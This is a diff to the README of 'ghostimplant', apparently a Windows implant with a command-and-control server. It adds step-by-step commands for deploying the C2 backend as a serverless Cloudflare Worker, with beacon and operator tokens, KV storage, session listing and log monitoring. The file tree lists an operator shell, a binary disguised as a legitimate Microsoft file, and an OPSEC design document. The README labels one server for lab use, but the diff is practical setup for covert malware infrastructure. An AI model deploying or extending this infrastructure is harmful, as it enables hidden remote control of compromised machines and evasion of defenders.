@@ -97,12 +97,23 @@
 | Windows SDK | 10.0.19041+ | For `winhttp.h`, `wbemidl.h`, `winternl.h` |
 | CMake *(optional)* | 3.20+ | Alternative to `build.ps1` |
 
-### Server (Python)
+### Server (Python — local/lab use)
 
 | Requirement | Version |
 |---|---|
 | Python | 3.10+ |
 | OpenSSL | Any (for cert generation) |
+
+### Server (Cloudflare Worker — distributed)
+
+| Requirement | Version |
+|---|---|
+| Node.js | 18+ |
+| Wrangler CLI | 3.22+ (`npm install -g wrangler`) |
+| Cloudflare Account | Free tier works for development |
+
+> **Full architecture details, data flow diagrams, KV schema, and OPSEC analysis are in
+> [SYSTEM_DESIGN.md](file:///c:/Users/lamic/OneDrive/Desktop/ghostimplant/SYSTEM_DESIGN.md).**
 
 ---
 
@@ -205,7 +216,74 @@ python3 c2_server.py
 
 Server starts on `0.0.0.0:443` with TLS.
 
-### 5. Update Implant Config
+---
+
+## Cloudflare Worker Deployment (Alternative)
+
+Use this instead of the Flask server for a distributed, serverless C2 backend.
+
+### 1. Install Wrangler
+
+```bash
+npm install -g wrangler
+wrangler login
+```
+
+### 2. Create KV Namespace
+
+```bash
+cd worker/
+npm install
+
+# Create production KV namespace
+wrangler kv:namespace create GHOST_KV
+# Output: { binding = "GHOST_KV", id = "abc123..." }
+
+# Copy the ID into wrangler.toml:
+#   [[kv_namespaces]]
+#   binding = "GHOST_KV"
+#   id = "abc123..."
+```
+
+### 3. Set Secrets
+
+```bash
+# These are encrypted at rest in Cloudflare's infrastructure
+wrangler secret put BEACON_TOKEN
+# Enter value: <paste your beacon token>
+
+wrangler secret put OPERATOR_TOKEN
+# Enter value: <paste your operator token>
+```
+
+### 4. Deploy
+
+```bash
+wrangler deploy
+# Output: https://ghost-c2.<your-subdomain>.workers.dev
+```
+
+### 5. Verify
+
+```bash
+# Health check (no auth)
+curl https://ghost-c2.<your-subdomain>.workers.dev/health
+
+# List sessions (with auth)
+curl -H "X-Operator-Token: <token>" \
+     https://ghost-c2.<your-subdomain>.workers.dev/sessions
+```
+
+### 6. Monitor Logs
+
+```bash
+# Real-time log stream
+wrangler tail
+```
+
+---
+
+### Update Implant Config
 
 Before building the implant, edit `src/c2.cpp`:
 
@@ -366,11 +444,18 @@ ghostimplant/
 │   ├── ghost.rc            # PE version info (mimics legitimate Microsoft binary)
 │   └── ghost.manifest      # Application manifest (asInvoker, Win10/11 compat)
 ├── server/
-│   ├── c2_server.py        # Flask HTTPS C2 listener with SQLite + auth + rate limiting
+│   ├── c2_server.py        # Flask HTTPS C2 listener with auth + rate limiting
 │   ├── c2_cli.py           # Operator CLI with interactive shell mode
 │   └── requirements.txt    # Python dependencies
+├── worker/
+│   ├── src/
+│   │   └── index.ts        # Cloudflare Worker C2 backend (serverless)
+│   ├── wrangler.toml       # Cloudflare deployment config + KV binding
+│   ├── tsconfig.json       # TypeScript compiler config
+│   └── package.json        # Node.js dependencies (wrangler, types)
 ├── CMakeLists.txt          # CMake build config (Debug/Release, LTCG)
 ├── build.ps1               # PowerShell build script (direct cl.exe)
+├── SYSTEM_DESIGN.md        # Full architecture, data flow, OPSEC, ATT&CK mapping
 ├── .gitignore
 └── README.md
 ```
